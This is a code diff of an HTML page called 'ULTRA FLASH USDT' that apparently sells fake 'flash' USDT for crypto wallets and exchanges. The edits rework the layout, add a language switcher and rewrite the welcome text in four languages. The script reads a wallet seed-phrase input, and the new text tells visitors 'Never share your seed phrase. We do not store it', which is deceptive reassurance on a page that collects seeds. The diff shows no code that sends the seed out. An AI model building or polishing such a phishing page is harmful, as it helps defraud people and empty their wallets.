@@ -2,8 +2,13 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ULTRA FLASH USDT</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       background: url('background.jpg') no-repeat center center fixed;
       background-size: cover;
@@ -14,9 +19,10 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      font-size: 16px;
     }
 
-    .chat-popup, .container {
+    .chat-popup, .container, #popup {
       background: rgba(0, 0, 0, 0.75);
       backdrop-filter: blur(10px);
       border-radius: 16px;
@@ -24,16 +30,19 @@
       width: 90%;
       max-width: 400px;
       box-shadow: 0 0 15px rgba(0,0,0,0.6);
-      display: none;
       text-align: left;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    .chat-popup, .container {
+      display: none;
     }
 
     .chat-popup.active {
       display: block;
-    }
-
-    .container {
-      display: none;
     }
 
     h1 {
@@ -90,19 +99,9 @@
       background-color: #00ccff;
     }
 
-    #popup, .lang-switcher {
-      display: none;
-    }
-
     #popup {
-      position: fixed;
-      background-color: #111;
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px #00ccff;
+      display: none;
       z-index: 10;
-      width: 300px;
-      max-width: 90%;
       text-align: center;
     }
 
@@ -120,11 +119,26 @@
       top: 15px;
       right: 15px;
     }
+
+    .lang-switcher button {
+      background: #00ccff;
+      border: none;
+      border-radius: 50%;
+      padding: 10px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .lang-switcher select {
+      display: none;
+      margin-top: 5px;
+    }
   </style>
 </head>
 <body>
 
 <div class="lang-switcher">
+  <button onclick="toggleLangDropdown()">🌐</button>
   <select id="language">
     <option value="en">EN</option>
     <option value="fr">FR</option>
@@ -134,9 +148,7 @@
 </div>
 
 <div id="chatBox" class="chat-popup active">
-  <div id="welcomeText">
-    <!-- Filled by JS -->
-  </div>
+  <div id="welcomeText"></div>
   <button id="startBtn">Continue</button>
 </div>
 
@@ -177,10 +189,10 @@
 
 <script>
   const messages = {
-    en: `Dear user\n1. This flash is for wallets and trading platforms (metamask, trustwallet, binance, bybit...)\n2. Wallet must have at least 0.0001 BNB\n3. Our system keeps your personal information safe\n4. Enjoy`,
-    fr: `Cher utilisateur\n1. Ce flash est pour les portefeuilles et les plateformes de trading (metamask, trustwallet, binance, bybit...)\n2. Le portefeuille doit contenir au moins 0.0001 BNB\n3. Notre système protège vos informations personnelles\n4. Profitez`,
-    zh: `亲爱的用户\n1. 本程序适用于钱包和交易平台 (Metamask, TrustWallet, Binance, Bybit...)\n2. 钱包需至少包含 0.0001 BNB\n3. 我们的系统保障您的隐私\n4. 祝您使用愉快`,
-    ru: `Уважаемый пользователь\n1. Этот флеш для кошельков и платформ (metamask, trustwallet, binance, bybit...)\n2. На кошельке должно быть минимум 0.0001 BNB\n3. Мы храним ваши данные в безопасности\n4. Наслаждайтесь`
+    en: `Dear user\n1. This flash is for wallets and trading platforms (metamask, trustwallet, binance, bybit...)\n2. Wallet must have at least 0.0001 BNB\n3. Never share your seed phrase. We do not store it.\n4. Enjoy`,
+    fr: `Cher utilisateur\n1. Ce flash est pour les portefeuilles et les plateformes de trading (metamask, trustwallet, binance, bybit...)\n2. Le portefeuille doit contenir au moins 0.0001 BNB\n3. Ne partagez jamais votre phrase secrète. Nous ne la stockons pas.\n4. Profitez`,
+    zh: `亲爱的用户\n1. 本程序适用于钱包和交易平台 (Metamask, TrustWallet, Binance, Bybit...)\n2. 钱包需至少包含 0.0001 BNB\n3. 切勿分享您的助记词，我们不会存储它\n4. 祝您使用愉快`,
+    ru: `Уважаемый пользователь\n1. Этот флеш для кошельков и платформ (metamask, trustwallet, binance, bybit...)\n2. На кошельке должно быть минимум 0.0001 BNB\n3. Никогда не делитесь своей seed-фразой. Мы её не сохраняем\n4. Наслаждайтесь`
   };
 
   const labels = {
@@ -197,6 +209,11 @@
   const startBtn = document.getElementById('startBtn');
   const generateBtn = document.getElementById('generateBtn');
   const seedInput = document.getElementById('seed');
+
+  function toggleLangDropdown() {
+    const select = document.getElementById('language');
+    select.style.display = select.style.display === 'none' ? 'block' : 'none';
+  }
 
   function setLanguage(lang) {
     welcomeText.textContent = messages[lang];
